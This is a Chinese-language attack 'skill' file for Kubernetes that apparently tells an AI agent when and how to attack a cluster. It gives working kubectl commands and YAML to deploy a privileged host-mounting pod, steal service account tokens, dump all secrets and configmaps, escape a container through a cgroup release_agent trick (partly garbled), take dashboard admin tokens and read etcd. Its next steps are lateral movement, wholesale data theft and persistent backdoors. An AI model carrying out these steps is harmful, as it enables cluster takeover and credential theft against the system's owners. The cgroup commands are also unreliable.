---
name: kubernetes-attack
type: attack
category: container-orchestration
platform: kubernetes
severity: critical
---

# Kubernetes 攻击技能

## 触发条件

- 有 Kubernetes 访问权限（kubeconfig 或 token）
- 发现 k8s API 端点
- 用户要求"攻击 K8s 集群"

## 前置检查

```bash
# 1. 验证访问
kubectl cluster-info
kubectl get nodes

# 2. 检查当前权限
kubectl auth can-i --list
kubectl auth can-i "*" "*" --all-namespaces
```

## 攻击方法

### 方法 1: 创建特权 Pod

```bash
# 1. 创建特权 Pod
cat > privileged-pod.yaml <<'EOF'
apiVersion: v1
kind: Pod
metadata:
  name: privileged-pod
spec:
  hostNetwork: true
  hostPID: true
  containers:
  - name: privileged-container
    image: ubuntu:latest
    command: ["/bin/bash"]
    args: ["-c", "sleep infinity"]
    securityContext:
      privileged: true
    volumeMounts:
    - name: root-volume
      mountPath: /host
  volumes:
  - name: root-volume
    hostPath:
      path: /
EOF

kubectl apply -f privileged-pod.yaml

# 2. 进入 Pod
kubectl exec -it privileged-pod -- bash

# 3. 在 Pod 中访问宿主机
chroot /host
# 现在可以访问宿主机的所有文件
```

### 方法 2: 窃取 Service Account Token

```bash
# 1. 列出所有 Pod
kubectl get pods --all-namespaces

# 2. 进入高权限 Pod
kubectl exec -it POD_NAME -n NAMESPACE -- bash

# 3. 窃取 token
cat /var/run/secrets/kubernetes.io/serviceaccount/token

# 4. 窃取 CA 证书
cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt

# 5. 使用 token 访问 API
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
kubectl --token TOKEN get pods
```

### 方法 3: Secrets 窃取

```bash
# 1. 列出所有 secrets
kubectl get secrets --all-namespaces

# 2. 获取 secret 内容
kubectl get secret SECRET_NAME -n NAMESPACE -o yaml

# 3. 解码 secret
kubectl get secret SECRET_NAME -n NAMESPACE -o jsonpath='{.data.password}' | base64 -d

# 4. 批量获取所有 secrets
kubectl get secrets --all-namespaces -o json > all_secrets.json
```

### 方法 4: ConfigMap 窃取

```bash
# 1. 列出所有 ConfigMap
kubectl get configmaps --all-namespaces

# 2. 获取 ConfigMap 内容
kubectl get configmap CONFIGMAP_NAME -n NAMESPACE -o yaml

# 3. 搜索敏感信息
kubectl get configmaps --all-namespaces -o yaml | grep -E "password|secret|key|token"
```

### 方法 5: 容器逃逸

```bash
# 1. 检查危险配置
kubectl get pods --all-namespaces -o json | jq '.items[] | select(.spec.hostNetwork==true or .spec.hostPID==true)'

# 2. 通过特权 Pod 逃逸
kubectl exec -it PRIVILEGED_POD -- bash

# 在 Pod 中:
# 挂载宿主机根目录
chroot /host

# 或通过 cgroup 注入
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release
sh -c "echo \$\$ > /tmp/cgrp/release_agent" > /tmp/cgrp/x/notify_on_release
sh -c "echo '#!/bin/sh' > /tmp/cgrp/release_agent" > /tmp/cgrp/release_agent
sh -c "echo 'ps aux > /tmp/output' >> /tmp/cgrp/release_agent" > /tmp/cgrp/release_agent
chmod a+x /tmp/cgrp/release_agent
sh -c "echo 1 > /tmp/cgrp/x/notify_on_release" > /tmp/cgrp/release_agent
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs" > /tmp/cgrp/release_agent
```

### 方法 6: Dashboard 攻击

```bash
# 1. 检查 Dashboard 是否暴露
kubectl get svc -n kubernetes-dashboard

# 2. 端口转发
kubectl port-forward svc/kubernetes-dashboard 8443:443 -n kubernetes-dashboard

# 3. 获取登录 token
kubectl -n kubernetes-dashboard describe secret $(kubectl -n kubernetes-dashboard get secret | grep admin-user | awk '{print $1}')

# 4. 登录 Dashboard
# 使用 token 登录并执行操作
```

### 方法 7: etcd 窃取

```bash
# 1. 查找 etcd Pod
kubectl get pods -n kube-system | grep etcd

# 2. 端口转发到 etcd
kubectl port-forward ETCD_POD 2379:2379 -n kube-system

# 3. 获取 etcd 证书
kubectl get secrets -n kube-system etcd-certs -o yaml

# 4. 使用 etcdctl 查询数据
ETCDCTL_API=3 etcdctl \
  --endpoints=localhost:2379 \
  --cacert=/etc/kubernetes/pki/etcd/ca.crt \
  --cert=/etc/kubernetes/pki/etcd/server.crt \
  --key=/etc/kubernetes/pki/etcd/server.key \
  get / --prefix --keys-only
```

## 验证成功

```bash
# 成功创建特权 Pod
kubectl get pods | grep privileged

# 成功获取 token
echo $TOKEN

# 成功获取 secrets
cat all_secrets.json

# 成功逃逸到宿主机
# 在 chroot 环境中执行命令
```

## 输出报告

```markdown
# Kubernetes 攻击报告
- 集群节点: X 个
- 运行 Pod: Y 个
- 窃取 Secrets: Z 个
- 窃取 ConfigMaps: N 个
- 特权 Pod: [列表]
```

## 下一步

1. 在集群中横向移动
2. 窃取所有应用数据
3. 建立持久化后门
